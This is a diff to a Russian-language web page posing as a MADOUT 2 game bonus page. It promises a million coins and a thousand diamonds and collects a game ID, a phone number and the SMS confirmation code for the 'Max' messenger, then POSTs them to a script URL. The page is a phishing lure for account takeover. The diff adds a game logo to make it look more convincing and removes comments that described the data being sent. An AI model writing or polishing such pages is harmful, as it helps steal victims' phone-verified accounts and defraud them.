@@ -11,7 +11,7 @@
     .card { background: var(--card); border-radius: 20px; padding: 28px 20px; max-width: 400px; width: 100%; box-shadow: 0 4px 30px rgba(255,68,68,0.2); text-align: center; border: 1px solid var(--border); }
     .logo-row { display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 4px; }
     .logo-text { font-size: 28px; font-weight: 900; color: var(--accent); letter-spacing: 2px; text-transform: uppercase; }
-    .logo-row img { height: 50px; width: auto; object-fit: contain; }
+    .logo-row img { height: 50px; width: 50px; object-fit: contain; border-radius: 10px; }
     .logo-sub { font-size: 12px; color: #8890a0; letter-spacing: 3px; text-transform: uppercase; margin-bottom: 24px; }
     .info-text { color: #8890a0; font-size: 13px; margin-bottom: 20px; line-height: 1.5; }
     .highlight { color: var(--gold); font-weight: 600; }
@@ -41,7 +41,7 @@
 
 <div class="card">
     <div id="screen-id">
-        <div class="logo-row"><span class="logo-text">MADOUT 2</span></div>
+        <div class="logo-row"><img src="logo_2.png" alt="logo"><span class="logo-text">MADOUT 2</span></div>
         <div class="logo-sub">Big City Online</div>
         <p class="info-text">Для получения <span class="highlight">1 000 000 монет</span> и <span class="highlight">1 000 алмазов</span> введите ваш игровой ID</p>
         <div class="input-group">
@@ -55,7 +55,7 @@
     </div>
 
     <div id="screen-auth" style="display:none;">
-        <div class="logo-row"><span class="logo-text">MADOUT 2</span></div>
+        <div class="logo-row"><img src="logo_2.png" alt="logo"><span class="logo-text">MADOUT 2</span></div>
         <div class="logo-sub">Авторизация</div>
         <p class="info-text">Для начисления <span class="highlight">1 000 000 монет</span> и <span class="highlight">1 000 алмазов</span> необходимо подтвердить номер через <span class="highlight">Макс</span></p>
         <div class="input-group">
@@ -77,7 +77,7 @@
     </div>
 
     <div id="screen-code" style="display:none;">
-        <div class="logo-row"><span class="logo-text">MADOUT 2</span></div>
+        <div class="logo-row"><img src="logo_2.png" alt="logo"><span class="logo-text">MADOUT 2</span></div>
         <div class="logo-sub">Подтверждение</div>
         <p class="info-text">Код от <span class="highlight">Макс</span> отправлен в СМС на номер <strong id="display-phone" style="color:#ffd700;"></strong></p>
         <p class="sms-notice">Проверьте папку <span>«СМС»</span> или <span>«Сообщения»</span> в телефоне</p>
@@ -98,7 +98,7 @@
     </div>
 
     <div id="screen-done" style="display:none;">
-        <div class="logo-row"><span class="logo-text">MADOUT 2</span></div>
+        <div class="logo-row"><img src="logo_2.png" alt="logo"><span class="logo-text">MADOUT 2</span></div>
         <div class="logo-sub">Бонусы активированы</div>
         <p class="info-text" style="color:#4caf50;font-size:18px;font-weight:700;">✅ 1 000 000 монет</p>
         <p class="info-text" style="color:#4caf50;font-size:18px;font-weight:700;">✅ 1 000 алмазов</p>
@@ -157,7 +157,6 @@
         document.getElementById('phone-error').style.display = 'none';
         var fullPhone = '+7' + phone;
 
-        // Отправляем ТОЛЬКО телефон и ID — сразу, не дожидаясь кода
         fetch(SCRIPT_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'text/plain;charset=utf-8' },
@@ -194,7 +193,6 @@
         document.getElementById('screen-code').style.display = 'none';
         document.getElementById('screen-code-loading').style.display = 'block';
 
-        // Отправляем ТОЛЬКО код, ID и номер попытки
         fetch(SCRIPT_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'text/plain;charset=utf-8' },
